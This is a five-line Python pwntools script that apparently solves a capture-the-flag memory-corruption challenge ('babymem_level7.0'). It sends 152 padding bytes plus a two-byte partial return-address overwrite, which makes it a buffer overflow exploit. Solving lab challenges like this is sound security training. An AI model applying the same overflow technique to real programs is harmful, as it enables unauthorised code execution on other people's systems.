import pwn
r = pwn.process("/challenge/babymem_level7.0")
r.sendline("1024")
r.send(b'\x00'*152+b'\x22\x46')
print(r.readall())
